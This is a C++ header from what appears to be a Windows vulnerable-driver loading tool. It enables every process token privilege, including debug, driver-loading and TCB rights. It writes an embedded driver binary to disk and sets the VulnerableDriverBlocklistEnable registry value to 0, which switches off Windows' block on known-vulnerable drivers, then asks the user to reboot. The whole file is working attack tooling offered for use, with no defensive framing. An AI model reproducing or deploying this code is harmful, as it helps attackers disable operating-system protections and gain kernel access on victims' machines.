#pragma once
#include "Utils.h"

void EnableAllPrivileges() {
    HANDLE cProcess = GetCurrentProcess(); HANDLE hToken;
    OpenProcessToken(cProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    std::string privileges[35] = { "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
        "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
        "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
        "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
        "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
        "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

    for (int p = 0; p < 35; p++) {
        std::wstring name(privileges[p].begin(), privileges[p].end());
        TOKEN_PRIVILEGES tp;
        LUID luid;

        if (!LookupPrivilegeValueW(NULL, name.c_str(), &luid)) {}

        // printf("%ws -> %p\n", name.c_str(), luid);

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {}
    }

    CloseHandle(cProcess);
    CloseHandle(hToken);
}

std::wstring GetCurrentDir() {
    TCHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

bool fileExists(const std::wstring& filename) {
    DWORD attributes = GetFileAttributes(filename.c_str());
    return (attributes != INVALID_FILE_ATTRIBUTES &&
        !(attributes & FILE_ATTRIBUTE_DIRECTORY));
}

std::wstring GetWorkingDir() {
    std::wstring wsWorkingDirectory = GetCurrentDir() + L"\\DriverLike";
    
    if (!fileExists(wsWorkingDirectory)) {
        CreateDirectory(wsWorkingDirectory.c_str(), NULL);
    }

    return wsWorkingDirectory;
}

std::wstring WriteDriverToFile() {
    std::wstring wsWorkingDirectory = GetWorkingDir();
    std::wstring wsDriverPath = wsWorkingDirectory + L"\\" + DRIVER_NAME;
    if (fileExists(wsDriverPath))
        return wsDriverPath;

    std::ofstream drvout(wsDriverPath, std::ios::out | std::ios::binary);
    drvout.write((char*)driverbytes, sizeof(driverbytes));
    drvout.close();
    return wsDriverPath;
}

bool CheckAndDisableDriverCheck(bool debug) {
    HKEY reg;
    DWORD success = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CI\\Config", 0, KEY_READ | KEY_SET_VALUE, &reg);
    if (success == ERROR_NO_MATCH || success == ERROR_FILE_NOT_FOUND) {
        printf("[!] Code Integrity registry key does not exist. Attempting load...\n");
        return true;
    }

    DWORD KeyValue;
    DWORD length = sizeof(KeyValue);
    DWORD type = REG_DWORD;
    RegQueryValueEx(reg, L"VulnerableDriverBlocklistEnable", 0, (LPDWORD)&type, (LPBYTE)&KeyValue, &length);
    DBGPRINT("[+] Code Integrity flag value: %d\n", KeyValue);
    
    if (KeyValue == 0) return true;
    DWORD value = 0;
    success = RegSetKeyValueW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CI\\Config", L"VulnerableDriverBlocklistEnable", REG_DWORD, &value, sizeof(DWORD));
    
    printf("[!] Set the CI value to 0. Restart your PC, and then start this program.");
    
    RegCloseKey(reg);
    exit(-1);
}

std::wstring GetSystem32Path() {
    return L"C:\\Windows\\System32\\";
}